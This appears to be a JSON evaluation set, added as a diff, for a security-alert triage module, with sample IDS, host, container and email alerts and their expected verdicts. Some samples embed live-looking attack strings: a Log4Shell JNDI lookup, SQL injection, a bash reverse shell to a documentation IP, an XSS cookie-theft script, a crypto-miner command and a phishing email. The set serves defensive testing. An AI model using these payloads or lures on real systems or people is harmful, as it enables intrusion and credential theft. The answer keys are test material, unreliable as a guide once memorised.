@@ -1,0 +1,89 @@
+{
+  "说明": "安全告警分析模块评测集 — 样本基于官方格式与真实攻击特征构造 (Suricata 样本取自官方文档, RFC5737 文档 IP 段, 真实 CVE/恶意软件家族/规则 ID)。expected 为人工标准答案, 用于自动对照。",
+  "cases": [
+    {
+      "id": "T01",
+      "format": "suricata_eve",
+      "label": "可疑外联- dotted quad POST (官方文档真实样本)",
+      "input": "{\"timestamp\":\"2009-11-24T21:27:09.534255\",\"flow_id\":586497171462735,\"pcap_cnt\":53381,\"event_type\":\"alert\",\"src_ip\":\"192.168.2.14\",\"src_port\":50096,\"dest_ip\":\"209.53.113.5\",\"dest_port\":80,\"proto\":\"TCP\",\"metadata\":{\"flowbits\":[\"http.dottedquadhost\"]},\"tx_id\":4,\"alert\":{\"action\":\"allowed\",\"gid\":1,\"signature_id\":2018358,\"rev\":10,\"signature\":\"ET HUNTING GENERIC SUSPICIOUS POST to Dotted Quad with Fake Browser 1\",\"category\":\"Potentially Bad Traffic\",\"severity\":2},\"app_proto\":\"http\"}",
+      "expected": {"domain": "security", "verdict": ["malicious", "suspicious"], "ioc_must": ["209.53.113.5"], "mitre_hint": "T1071"}
+    },
+    {
+      "id": "T02",
+      "format": "suricata_eve",
+      "label": "漏洞利用 - Log4Shell RCE 尝试",
+      "input": "{\"timestamp\":\"2025-03-18T09:41:23.882011\",\"flow_id\":1902384756281934,\"event_type\":\"alert\",\"src_ip\":\"203.0.113.77\",\"src_port\":51522,\"dest_ip\":\"192.168.1.30\",\"dest_port\":8080,\"proto\":\"TCP\",\"tx_id\":2,\"alert\":{\"action\":\"blocked\",\"gid\":1,\"signature_id\":2034646,\"rev\":6,\"signature\":\"ET WEB_SERVER Possible Apache Log4j RCE Attempt (CVE-2021-44228) (http.headers)\",\"category\":\"Attempted Administrator Privilege Gain\",\"severity\":1},\"http\":{\"hostname\":\"internal-app.corp.local\",\"url\":\"\\/api\\/config\",\"http_user_agent\":\"${jndi:ldap:\/\/203.0.113.77\\/a}\",\"http_method\":\"POST\",\"protocol\":\"HTTP\\/1.1\",\"status\":403},\"app_proto\":\"http\"}",
+      "expected": {"domain": "security", "verdict": ["malicious"], "ioc_must": ["203.0.113.77", "CVE-2021-44228"], "mitre_hint": "T1190"}
+    },
+    {
+      "id": "T03",
+      "format": "wazuh_json",
+      "label": "SSH 暴力破解聚合 (rule 5720)",
+      "input": "{\"timestamp\":\"2025-03-18T10:15:44.612+0000\",\"rule\":{\"level\":10,\"description\":\"Multiple authentication failures.\",\"id\":\"5720\",\"firedtimes\":14,\"mail\":false,\"groups\":[\"syslog\",\"sshd\",\"authentication_failures\"]},\"agent\":{\"id\":\"012\",\"name\":\"prod-web-02\"},\"decoder\":{\"name\":\"sshd\"},\"data\":{\"srcip\":\"198.51.100.23\",\"srcuser\":\"root\"},\"location\":\"\\/var\\/log\\/auth.log\",\"full_log\":\"Mar 18 10:15:43 prod-web-02 sshd[28841]: Failed password for root from 198.51.100.23 port 41234 ssh2 (14th failure)\",\"id\":\"1742295377.315221\"}",
+      "expected": {"domain": "security", "verdict": ["malicious", "suspicious"], "ioc_must": ["198.51.100.23"], "mitre_hint": "T1110"}
+    },
+    {
+      "id": "T04",
+      "format": "wazuh_json",
+      "label": "Web 攻击命中 (rule 31151 SQL 注入)",
+      "input": "{\"timestamp\":\"2025-03-18T11:02:19.304+0000\",\"rule\":{\"level\":6,\"description\":\"Web server 400 error code.\",\"id\":\"31151\",\"firedtimes\":5,\"groups\":[\"web\",\"accesslog\",\"web-400\"]},\"agent\":{\"id\":\"007\",\"name\":\"dmz-app-01\"},\"data\":{\"srcip\":\"203.0.113.140\",\"id\":\"400\"},\"location\":\"\\/var\\/log\\/nginx\\/access.log\",\"full_log\":\"203.0.113.140 - - [18/Mar/2025:11:02:18 +0000] \\\"GET /product.php?id=1'+UNION+SELECT+username,password+FROM+admin_users-- HTTP/1.1\\\" 400 153\",\"id\":\"1742298139.315222\"}",
+      "expected": {"domain": "security", "verdict": ["malicious", "suspicious"], "ioc_must": ["203.0.113.140"], "mitre_hint": "T1190"}
+    },
+    {
+      "id": "T05",
+      "format": "falco_json",
+      "label": "容器内反弹 Shell",
+      "input": "{\"time\":\"2025-03-18T12:33:07.856598053Z\",\"hostname\":\"k8s-node-03\",\"output\":\"12:33:07.856597145: Notice A shell was spawned in a container with an attached terminal (user=root user_loginuid=-1 container_name=payments-api container_id=8f3a21c9e56b shell=bash parent=nc cmdline=bash -i fd=/dev/tcp/203.0.113.99/4444 0<&1 1>&2 2>&2 event_type=execve)\",\"priority\":\"Notice\",\"rule\":\"Terminal shell in container\",\"tags\":[\"container\",\"shell\",\"mitre_execution\",\"T1059\"],\"output_fields\":{\"container.name\":\"payments-api\",\"container.id\":\"8f3a21c9e56b\",\"user.name\":\"root\",\"evt.type\":\"execve\",\"proc.cmdline\":\"bash -i\",\"proc.name\":\"bash\",\"proc.parent\":\"nc\"}}",
+      "expected": {"domain": "security", "verdict": ["malicious"], "ioc_must": ["203.0.113.99"], "mitre_hint": "T1059"}
+    },
+    {
+      "id": "T06",
+      "format": "falco_json",
+      "label": "阴性对照 - 容器内正常日志查看",
+      "input": "{\"time\":\"2025-03-18T13:10:22.123456789Z\",\"hostname\":\"k8s-node-03\",\"output\":\"13:10:22.123455910: Informational Container launched (user=deploy container_name=ci-runner container_id=2b7ce4f0a191 image=docker.io/library/alpine:3.19 cmdline=cat /var/log/app/debug.log event_type=execve)\",\"priority\":\"Informational\",\"rule\":\"Container launched\",\"tags\":[\"container\"],\"output_fields\":{\"container.name\":\"ci-runner\",\"user.name\":\"deploy\",\"proc.cmdline\":\"cat /var/log/app/debug.log\",\"proc.name\":\"cat\"}}",
+      "expected": {"domain": "security", "verdict": ["benign", "false_positive"], "ioc_must": []}
+    },
+    {
+      "id": "T07",
+      "format": "cef",
+      "label": "CEF - 疑似 C2 外联 (DGA 域名)",
+      "input": "CEF:0|Security|Apex|1.0|100|Suspected malware callback to dynamic DNS domain|8|src=192.168.1.57 spt=52311 dst=203.0.113.201 dpt=443 proto=TCP request=xkvdqmwzr8t2p4.dyndns-work.com act=blocked externalId=84721 msg=Endpoint detected repeated HTTPS beaconing at irregular intervals to dynamic DNS domain, URI pattern /gate.php",
+      "expected": {"domain": "security", "verdict": ["malicious", "suspicious"], "ioc_must": ["203.0.113.201"], "mitre_hint": "T1071"}
+    },
+    {
+      "id": "T08",
+      "format": "cef",
+      "label": "阴性对照 - CEF 正常 VPN 登录",
+      "input": "CEF:0|Security|SecureGate|2.3|200|User login success|2|src=198.51.100.10 suser=wei.zhang duser=wei.zhang cs1=vpn-gw-01 cs1Label=vpnGateway cs2=MacBook-Pro cs2Label=device cs3=IT-Dept cs3Label=department msg=User authenticated via radius, session established for remote work",
+      "expected": {"domain": "security", "verdict": ["benign", "false_positive"], "ioc_must": []}
+    },
+    {
+      "id": "T09",
+      "format": "free_text",
+      "label": "自由文本 - WAF 拦截存储型 XSS",
+      "input": "WAF 拦截告警: 2025-03-18 14:22, 源 IP 203.0.113.188 对客户门户 www.shop-example.com/profile 的 POST /profile/save 请求被拦截, payload 检测到存储型 XSS: <script>document.location='https://evil-collect.example/steal?c='+document.cookie</script>, 规则 ID CRS-941320, 命中 3 次 (同一源 10 分钟内), 该 IP 此前无任何合法会话",
+      "expected": {"domain": "security", "verdict": ["malicious", "suspicious"], "ioc_must": ["203.0.113.188"], "mitre_hint": "T1059"}
+    },
+    {
+      "id": "T10",
+      "format": "free_text",
+      "label": "自由文本 - 主机挖矿进程",
+      "input": "EDR 告警: 服务器 prod-db-01 (192.168.3.12) 上发现可疑进程 /tmp/.x/xmrig 进程 PID 31234, CPU 占用持续 97%, 父进程为 crond, 命令行含 --donate-level 1 -o pool.minexmr.example:3333 -u wallet_4JU7...kQ9, /etc/crontab 被添加了定时任务 */30 * * * * /tmp/.x/xmrig, 该服务器上月底前 CPU 正常",
+      "expected": {"domain": "security", "verdict": ["malicious"], "ioc_must": ["192.168.3.12"], "mitre_hint": "T1496"}
+    },
+    {
+      "id": "E01",
+      "format": "email_eml",
+      "label": "邮件 - BEC 冒充 + 凭据钓鱼",
+      "input": "From: \"IT Support Center\" <it-support@gzhu-edu-support.com>\nReply-To: helpdesk.recovery@mail-quickfix.top\nReturn-Path: <bounce@mail-quickfix.top>\nTo: faculty@corp.example\nSubject: [Urgent] Your mailbox will be deactivated in 12 hours\nDate: Tue, 18 Mar 2025 09:12:33 +0800\n\nDear Faculty Member,\n\nOur records show your mailbox storage is full. Failure to verify within 12 hours will result in permanent deactivation of your email account.\n\nTo keep your mailbox active, please sign in with your campus credentials:\nhttp://mail-verify.portal-login.site/verify?id=faculty\n\nIf you have any questions, contact the IT helpdesk.\n\nIT Support Center",
+      "expected": {"classification": "phishing", "phishing_type": ["credential_phishing", "bec_fraud"], "note": "走 /email/triage"}
+    },
+    {
+      "id": "E02",
+      "format": "email_eml",
+      "label": "阴性对照 - 正常业务邮件",
+      "input": "From: \"Project Management Office\" <pmo@corp.example>\nTo: dev-team@corp.example\nSubject: Reminder: sprint review moved to Thursday 3pm\nDate: Tue, 18 Mar 2025 10:05:00 +0800\n\nTeam,\n\nA quick heads-up: this week's sprint review is moved from Wednesday to Thursday 3pm in meeting room 402.\nAgenda and latest burndown chart are on the wiki: https://wiki.corp.example/sprint/2025-Q1/review\n\nSee you there,\nPMO",
+      "expected": {"classification": "benign", "note": "走 /email/triage"}
+    }
+  ]
+}
